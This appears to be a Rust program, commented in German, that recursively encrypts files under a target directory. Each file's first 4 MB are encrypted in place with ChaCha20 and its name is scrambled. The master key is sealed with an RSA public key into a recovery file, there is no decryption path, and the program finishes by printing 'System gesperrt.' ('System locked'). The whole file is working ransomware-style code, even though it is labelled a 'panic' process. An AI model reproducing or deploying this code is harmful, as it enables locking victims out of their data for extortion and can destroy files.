use base64::{Engine as _, engine::general_purpose};
use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher};
use rand::{RngCore, thread_rng};
use rayon::prelude::*;
use rsa::{Oaep, RsaPublicKey, pkcs8::DecodePublicKey};
use sha2::{Digest, Sha256};
use std::fs::{self, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

// --- KONSTANTEN ---
const BUFFER_4MB: usize = 4 * 1024 * 1024;
const RECOVERY_FILE: &str = "INFO.bin";

// --- METADATEN STRUKTUR ---
#[derive(serde::Serialize, serde::Deserialize)]
struct RecoveryMetadata {
    encrypted_master_key: Vec<u8>, // RSA-verschlüsselter ChaCha-Key
    nonce_salt: [u8; 16],          // Salt für die Nonce-Berechnung
    chunk_size: usize,
}

impl RecoveryMetadata {
    // Berechnet die Nonce basierend auf dem Original-Pfad (LaTeX: $Nonce = Hash(Path + Salt)$)
    fn derive_nonce(&self, master_key: &[u8; 32], original_path: &str) -> [u8; 12] {
        let mut hasher = Sha256::new();
        hasher.update(master_key);
        hasher.update(original_path.as_bytes());
        hasher.update(self.nonce_salt);
        let result = hasher.finalize();
        let mut nonce = [0u8; 12];
        nonce.copy_from_slice(&result[0..12]);
        nonce
    }
}

// --- KERNFUNKTIONEN ---

fn main() -> anyhow::Result<()> {
    // 1. Initialisierung (In der Praxis via CLI-Args)
    let target_dir = "/home/jannik/Cloud/Dev/RAN/enc/test_data"; // Beispiel: Zielverzeichnis
    let dry_run = false;
    let pub_key_pem = fs::read_to_string("public.pem")?;
    let pub_key = RsaPublicKey::from_public_key_pem(&pub_key_pem)?;

    // 2. Master-Key & Salt generieren
    let mut master_key = [0u8; 32];
    let mut rng = thread_rng();
    rng.fill_bytes(&mut master_key);
    let mut salt = [0u8; 16];
    rng.fill_bytes(&mut salt);

    // 3. Recovery-Metadaten vorbereiten
    let enc_key = pub_key.encrypt(&mut rng, Oaep::new::<Sha256>(), &master_key)?;
    let meta = RecoveryMetadata {
        encrypted_master_key: enc_key,
        nonce_salt: salt,
        chunk_size: BUFFER_4MB,
    };

    // 4. Den "Panic-Prozess" starten
    println!("ACHTUNG: Verschlüsselung startet...");

    // Wir sammeln erst alle Pfade, um die MFT-Belastung zu bündeln
    let entries: Vec<PathBuf> = WalkDir::new(target_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .map(|e| e.into_path())
        .collect();

    // Parallele Verarbeitung mit Rayon
    entries.par_iter().for_each(|path| {
        if !dry_run {
            let _ = process_file(path, &master_key, &meta);
        }
    });

    // 5. Recovery-Info speichern (Am besten auf den USB-Stick)
    let mut serialized = Vec::new();
    serialized.extend_from_slice(&(meta.encrypted_master_key.len() as u64).to_le_bytes());
    serialized.extend_from_slice(&meta.encrypted_master_key);
    serialized.extend_from_slice(&meta.nonce_salt);
    serialized.extend_from_slice(&(meta.chunk_size as u64).to_le_bytes());
    fs::write(RECOVERY_FILE, &serialized)?;

    println!("System gesperrt.");
    Ok(())
}

fn process_file(path: &Path, master_key: &[u8; 32], meta: &RecoveryMetadata) -> anyhow::Result<()> {
    let original_path_str = path.to_string_lossy();
    let nonce = meta.derive_nonce(master_key, &original_path_str);
    let mut cipher = ChaCha20::new(master_key.into(), &nonce.into());

    // A: INHALT VERSCHLÜSSELN (In-Place)
    encrypt_content(path, &mut cipher)?;

    // B: DATEINAME VERSCHLÜSSELN (Renaming)
    rename_file(path, &mut cipher)?;

    Ok(())
}

fn encrypt_content(path: &Path, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let mut file = OpenOptions::new().read(true).write(true).open(path)?;
    let size = file.metadata()?.len();

    // Beispiel: Tiered Strategy (Nur Anfang verschlüsseln für Speed)
    let to_read = std::cmp::min(size, BUFFER_4MB as u64);
    let mut buffer = vec![0u8; to_read as usize];

    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);

    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn rename_file(path: &Path, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let old_name = path.file_name().unwrap().to_string_lossy();
    let mut name_bytes = old_name.as_bytes().to_vec();

    // Wichtig: Cipher zurücksetzen oder neue Nonce für Namen nutzen!
    cipher.apply_keystream(&mut name_bytes);

    let new_name = general_purpose::URL_SAFE_NO_PAD.encode(name_bytes);
    let mut new_path = path.to_path_buf();
    new_path.set_file_name(new_name);

    fs::rename(path, new_path)?;
    Ok(())
}
